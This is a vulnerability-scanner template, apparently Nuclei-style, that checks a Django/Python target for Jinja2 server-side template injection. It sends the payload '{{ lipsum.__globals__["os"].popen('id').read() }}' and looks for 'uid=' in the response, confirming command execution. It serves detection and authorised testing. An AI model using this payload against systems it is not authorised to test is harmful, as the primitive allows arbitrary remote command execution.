id: patt-ssti-jinja2-rce-02-template
name: 'PATT ssti patt-ssti-jinja2-rce-02 via template'
severity: critical
type: active
tags:
  - ssti
  - patt
requires:
  - python
  - django
description: 'PATT Jinja2 shortest RCE via lipsum.__globals__ (objectwalker). [patt:patt-ssti-jinja2-rce-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Python.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '{{ lipsum.__globals__["os"].popen(''id'').read() }}'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
